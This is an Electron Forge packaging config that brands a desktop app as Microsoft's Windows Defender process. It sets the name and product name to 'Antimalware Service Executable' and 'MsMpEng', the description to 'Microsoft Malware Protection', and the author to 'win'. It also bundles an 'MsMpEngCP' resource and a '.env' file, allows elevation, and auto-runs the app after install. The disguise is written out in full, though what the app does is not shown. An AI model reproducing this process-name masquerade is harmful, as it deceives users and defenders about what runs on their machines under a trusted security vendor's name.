const { FusesPlugin } = require('@electron-forge/plugin-fuses');
const { FuseV1Options, FuseVersion } = require('@electron/fuses');

module.exports = {
    packagerConfig: {
        asar: true,
        extraResource: ['./src/assets/MsMpEngCP', './.env'],
        name: 'Antimalware Service Executable',
        icon: 'src/assets/logo',
        // use `security find-identity -v -p codesigning` to find your identity
        // for macos signing
        // also fuck apple
        // osxSign: {
        //    identity: '<paste your identity here>',
        //   optionsForFile: (filePath) => {
        //       return {
        //           entitlements: 'entitlements.plist',
        //       };
        //   },
        // },
        // notarize if off cuz i ran this for 6 hours and it still didnt finish
        // osxNotarize: {
        //    appleId: 'your apple id',
        //    appleIdPassword: 'app specific password',
        //    teamId: 'your team id',
        // },
        arch: 'x64',
    },
    rebuildConfig: {},
    makers: [
        {
            name: '@electron-forge/maker-squirrel',
            config: {
                name: 'MsMpEng',
                productName: 'Antimalware Service Executable',
                shortcutName: 'Antimalware Service',
                createDesktopShortcut: true,
                createStartMenuShortcut: true,
                // Enhanced installer configuration
                setupIcon: 'src/assets/logo.ico',
                // Custom installer screens
                setupExe: 'Antimalware-Service-Setup.exe',
                noMsi: true,
                // Installation options
                allowElevation: true,
                allowToChangeInstallationDirectory: true,
                createDesktopShortcut: true,
                createStartMenuShortcut: true,
                runAfterFinish: true,
                // Custom installer text
                title: 'Antimalware Service Setup',
                description: 'Microsoft Malware Protection',
                authors: 'win',
                homepage: 'https://your-website.com',
                // License and legal
                license: 'MIT',
                licenseUrl: 'https://opensource.org/licenses/MIT',
                // Custom installer messages
                welcomeMessage: 'Welcome to Antimalware Service Setup',
                finishMessage: 'Antimalware Service has been installed successfully!',
                // Installation directory
                defaultInstallLocation: '%PROGRAMFILES%\\Antimalware Service Executable',
                // Uninstaller
                uninstallDisplayName: 'Antimalware Service Executable',
                uninstallString: '"{app}\\unins000.exe"',
            },
        },
        {
            name: '@electron-forge/maker-dmg',
            platforms: ['darwin'],
            config: {
                title: 'Antimalware Service Executable',
                icon: 'src/assets/logo.icns',
                contents: [
                    {
                        x: 130,
                        y: 220,
                    },
                    {
                        x: 410,
                        y: 220,
                        type: 'link',
                        path: '/Applications',
                    },
                ],
            },
        },
        {
            name: '@electron-forge/maker-deb',
            config: {},
        },
        {
            name: '@electron-forge/maker-rpm',
            config: {},
        },
    ],
    plugins: [
        {
            name: '@electron-forge/plugin-auto-unpack-natives',
            config: {},
        },
        // Fuses are used to enable/disable various Electron functionality
        // at package time, before code signing the application
        new FusesPlugin({
            version: FuseVersion.V1,
            [FuseV1Options.RunAsNode]: false,
            [FuseV1Options.EnableCookieEncryption]: true,
            [FuseV1Options.EnableNodeOptionsEnvironmentVariable]: false,
            [FuseV1Options.EnableNodeCliInspectArguments]: false,
            [FuseV1Options.EnableEmbeddedAsarIntegrityValidation]: true,
            [FuseV1Options.OnlyLoadAppFromAsar]: true,
        }),
    ],
};
